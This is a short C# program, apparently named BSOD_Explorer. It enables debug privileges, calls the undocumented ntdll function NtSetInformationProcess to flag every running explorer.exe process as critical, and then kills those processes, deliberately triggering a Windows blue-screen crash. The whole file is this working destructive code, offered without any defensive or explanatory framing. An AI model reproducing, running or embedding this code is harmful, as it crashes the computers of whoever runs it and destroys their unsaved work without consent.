using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace BSOD_Explorer
{
    internal class Program
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        static void Main(string[] args)
        {
            int isCritical = 1;
            int BreakOnTermination = 0x1D;
            Process.EnterDebugMode(); //Entering Debug Mode For This Current Process :D
            Process[] proc = Process.GetProcessesByName("explorer");
            foreach (Process proc_explorer in proc)
            {
                NtSetInformationProcess(proc_explorer.Handle, BreakOnTermination, ref isCritical, sizeof(int));
                proc_explorer.Kill();
            }
            Process.LeaveDebugMode(); //Leaving Debug Mode...
            Environment.Exit(20394);
        }
    }
}
